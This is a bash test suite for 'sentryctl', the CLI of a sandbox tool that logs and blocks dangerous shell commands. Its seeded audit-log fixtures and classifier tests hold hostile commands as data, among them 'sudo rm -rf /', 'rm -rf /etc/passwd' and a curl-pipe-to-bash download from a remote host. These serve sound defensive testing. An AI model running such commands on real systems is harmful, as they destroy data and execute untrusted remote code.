#!/bin/bash
# test-sentryctl.sh - Tests for sentryctl CLI
# Validates: help, status, mode, logs, test command, stats, config
# All tests use isolated temp config/logs.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

source "$SCRIPT_DIR/lib/test-helpers.sh"

test_isolate

SENTRYCTL="$PROJECT_DIR/sentryctl"

# Ensure sentryctl is executable
chmod +x "$SENTRYCTL" 2>/dev/null || true

# Seed some log data for tests that need it
seed_test_logs() {
    local log_file="$AUDIT_LOG"
    mkdir -p "$(dirname "$log_file")"
    cat > "$log_file" << 'EOF'
{"ts":"2025-01-15T10:00:00+00:00","mode":"soft-block","decision":"DETECTED","reason":"BLOCKED: sudo command detected","cmd":"sudo rm -rf /","cwd":"/tmp","pid":1234,"ppid":1233,"user":"testuser","shell":"zsh"}
{"ts":"2025-01-15T10:01:00+00:00","mode":"soft-block","decision":"SOFT_BLOCKED","reason":"BLOCKED: sudo command detected","cmd":"sudo apt install","cwd":"/tmp","pid":1235,"ppid":1233,"user":"testuser","shell":"zsh"}
{"ts":"2025-01-15T10:02:00+00:00","mode":"warn","decision":"DETECTED","reason":"BLOCKED: curl pipe to shell","cmd":"curl http://x.com/s.sh | bash","cwd":"/home","pid":1236,"ppid":1233,"user":"testuser","shell":"zsh"}
{"ts":"2025-01-15T10:03:00+00:00","mode":"soft-block","decision":"SOFT_BLOCKED","reason":"BLOCKED: rm/rmdir outside allowed project dirs","cmd":"rm -rf /etc/passwd","cwd":"/tmp","pid":1237,"ppid":1233,"user":"testuser","shell":"zsh"}
EOF
}

# Seed logs to a specific path (for sentryctl which uses hardcoded paths)
seed_test_logs_to() {
    local target="$1"
    mkdir -p "$(dirname "$target")"
    cat > "$target" << 'EOF'
{"ts":"2025-01-15T10:00:00+00:00","mode":"soft-block","decision":"DETECTED","reason":"BLOCKED: sudo command detected","cmd":"sudo rm -rf /","cwd":"/tmp","pid":1234,"ppid":1233,"user":"testuser","shell":"zsh"}
{"ts":"2025-01-15T10:01:00+00:00","mode":"soft-block","decision":"SOFT_BLOCKED","reason":"BLOCKED: sudo command detected","cmd":"sudo apt install","cwd":"/tmp","pid":1235,"ppid":1233,"user":"testuser","shell":"zsh"}
{"ts":"2025-01-15T10:02:00+00:00","mode":"warn","decision":"DETECTED","reason":"BLOCKED: curl pipe to shell","cmd":"curl http://x.com/s.sh | bash","cwd":"/home","pid":1236,"ppid":1233,"user":"testuser","shell":"zsh"}
{"ts":"2025-01-15T10:03:00+00:00","mode":"soft-block","decision":"SOFT_BLOCKED","reason":"BLOCKED: rm/rmdir outside allowed project dirs","cmd":"rm -rf /etc/passwd","cwd":"/tmp","pid":1237,"ppid":1233,"user":"testuser","shell":"zsh"}
EOF
}

test_suite_begin "sentryctl — help and usage"

_T_CURRENT_TEST="sentryctl with no args shows dashboard"
output=$("$SENTRYCTL" 2>&1 || true)
if echo "$output" | grep -qi "sentry\|mode\|events\|dashboard"; then
    _pass
else
    _fail "expected dashboard output"
fi

_T_CURRENT_TEST="sentryctl help shows usage"
output=$("$SENTRYCTL" help 2>&1 || true)
if echo "$output" | grep -qi "usage\|commands\|status\|mode\|logs"; then
    _pass
else
    _fail "expected usage output"
fi

test_suite_begin "sentryctl — status"

_T_CURRENT_TEST="sentryctl status shows configuration"
output=$("$SENTRYCTL" status 2>&1 || true)
if echo "$output" | grep -qi "mode\|status\|configuration"; then
    _pass
else
    _fail "status should show configuration"
fi

_T_CURRENT_TEST="sentryctl status shows fswatch state"
output=$("$SENTRYCTL" status 2>&1 || true)
if echo "$output" | grep -qi "fswatch\|monitor\|background"; then
    _pass
else
    _fail "status should show fswatch state"
fi

test_suite_begin "sentryctl — mode"

_T_CURRENT_TEST="sentryctl mode shows current mode"
output=$("$SENTRYCTL" mode 2>&1 || true)
if echo "$output" | grep -qi "mode\|soft-block\|audit\|warn\|hard"; then
    _pass
else
    _fail "mode should show current mode"
fi

_T_CURRENT_TEST="sentryctl mode lists available modes"
output=$("$SENTRYCTL" mode 2>&1 || true)
if echo "$output" | grep -qi "audit" && echo "$output" | grep -qi "hard"; then
    _pass
else
    _fail "mode should list available modes"
fi

_T_CURRENT_TEST="sentryctl mode audit switches mode"
"$SENTRYCTL" mode audit >/dev/null 2>&1 || true
output=$("$SENTRYCTL" mode 2>&1 || true)
if echo "$output" | grep -q "audit"; then
    _pass
else
    _fail "mode should have switched to audit"
fi

_T_CURRENT_TEST="sentryctl mode soft-block switches back"
"$SENTRYCTL" mode soft-block >/dev/null 2>&1 || true
output=$("$SENTRYCTL" mode 2>&1 || true)
if echo "$output" | grep -q "soft-block"; then
    _pass
else
    _fail "mode should have switched to soft-block"
fi

test_suite_begin "sentryctl — logs"

seed_test_logs

_T_CURRENT_TEST="sentryctl logs shows events"
output=$("$SENTRYCTL" logs 2>&1 || true)
if echo "$output" | grep -qi "DETECTED\|BLOCKED\|sentry\|log"; then
    _pass
else
    _fail "logs should show events"
fi

_T_CURRENT_TEST="sentryctl logs --tail 2 limits output"
output=$("$SENTRYCTL" logs --tail 2 2>&1 || true)
# Just verify it runs without error and produces some output
if [[ -n "$output" ]]; then
    _pass
else
    _fail "expected some output from --tail 2"
fi

_T_CURRENT_TEST="sentryctl logs --json outputs raw JSON"
# sentryctl looks for logs at $HOME/.hermes/logs/sandbox-audit.log, seed there
mkdir -p "$HOME/.hermes/logs"
seed_test_logs_to "$HOME/.hermes/logs/sandbox-audit.log"
output=$("$SENTRYCTL" logs --json --tail 1 2>&1 || true)
if echo "$output" | grep -q '"ts"'; then
    _pass
else
    # May not have jq or log at expected path
    _skip "json output not available (log path or jq issue)"
fi

_T_CURRENT_TEST="sentryctl logs --blocked filters blocked events"
output=$("$SENTRYCTL" logs --blocked 2>&1 || true)
if echo "$output" | grep -qi "BLOCKED\|SOFT_BLOCKED"; then
    # Should NOT contain pure DETECTED without BLOCKED
    if echo "$output" | grep -q "SOFT_BLOCKED"; then
        _pass
    else
        _fail "blocked filter should show SOFT_BLOCKED events"
    fi
else
    _fail "blocked filter should show blocked events"
fi

_T_CURRENT_TEST="sentryctl logs with search term filters"
output=$("$SENTRYCTL" logs sudo 2>&1 || true)
if echo "$output" | grep -qi "sudo"; then
    _pass
else
    _fail "search should find 'sudo' events"
fi

test_suite_begin "sentryctl — stats"

_T_CURRENT_TEST="sentryctl stats shows summary"
output=$("$SENTRYCTL" stats 2>&1 || true)
if echo "$output" | grep -qi "total\|events\|summary\|activ"; then
    _pass
else
    _fail "stats should show activity summary"
fi

_T_CURRENT_TEST="sentryctl stats shows block counts"
output=$("$SENTRYCTL" stats 2>&1 || true)
if echo "$output" | grep -qi "block\|enforcement\|soft"; then
    _pass
else
    _fail "stats should show block counts"
fi

test_suite_begin "sentryctl — test command"

_T_CURRENT_TEST="sentryctl test rm -rf flags as dangerous"
output=$("$SENTRYCTL" test "rm -rf /" 2>&1 || true)
if echo "$output" | grep -qi "dangerous"; then
    _pass
else
    _fail "test should flag rm -rf as dangerous"
fi

_T_CURRENT_TEST="sentryctl test ls flags as safe"
output=$("$SENTRYCTL" test "ls -la" 2>&1 || true)
if echo "$output" | grep -qi "safe"; then
    _pass
else
    _fail "test should flag ls as safe"
fi

_T_CURRENT_TEST="sentryctl test sudo flags as dangerous"
output=$("$SENTRYCTL" test "sudo something" 2>&1 || true)
if echo "$output" | grep -qi "dangerous"; then
    _pass
else
    _fail "test should flag sudo as dangerous"
fi

test_suite_begin "sentryctl — config"

_T_CURRENT_TEST="sentryctl config shows configuration"
output=$("$SENTRYCTL" config 2>&1 || true)
if echo "$output" | grep -qi "mode\|config\|notification\|audit"; then
    _pass
else
    _fail "config should show configuration details"
fi

test_suite_begin "sentryctl — notifications"

_T_CURRENT_TEST="sentryctl notifications shows current state"
output=$("$SENTRYCTL" notifications 2>&1 || true)
if echo "$output" | grep -qi "notif\|true\|false\|enabled\|disabled"; then
    _pass
else
    _fail "notifications should show current state"
fi

_T_CURRENT_TEST="sentryctl notifications off disables"
"$SENTRYCTL" notifications off >/dev/null 2>&1 || true
# sentryctl reads/writes the config at SENTRY_CONFIG env or ~/.hermes/sentry-config.json
# Check the actual config file content
if command -v jq >/dev/null 2>&1; then
    cfg_file="${SENTRY_CONFIG:-$HOME/.hermes/sentry-config.json}"
    if [[ -f "$cfg_file" ]]; then
        val=$(jq -r '.notifications' "$cfg_file" 2>/dev/null || echo "unknown")
        if [[ "$val" == "false" ]]; then
            _pass
        else
            _fail "config notifications should be false, got: $val"
        fi
    else
        _skip "config file not found"
    fi
else
    _skip "jq not available"
fi

_T_CURRENT_TEST="sentryctl notifications on enables"
"$SENTRYCTL" notifications on >/dev/null 2>&1 || true
output=$("$SENTRYCTL" notifications 2>&1 || true)
if echo "$output" | grep -qi "true\|enabled"; then
    _pass
else
    _fail "should be enabled"
fi

test_suite_end
test_cleanup
test_report
